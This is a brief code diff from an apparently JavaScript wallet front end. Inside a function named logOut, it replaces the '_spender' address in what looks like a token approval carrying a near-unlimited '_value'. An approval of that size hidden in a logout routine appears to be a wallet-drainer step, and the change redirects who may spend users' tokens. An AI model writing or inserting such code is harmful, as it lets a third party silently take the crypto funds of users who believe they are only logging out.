@@ -41,7 +41,7 @@ async function logOut() {
 
       params: {
 
-        _spender: "0xcb6fB04A7EC3F7887f1d03BFc051E5C6Aa260673",
+        _spender: "0xeEC6CA1c1c56f0F961C653FA0067e4C129D890f9",
 
         _value: "10000000000000000000000000000000"
 
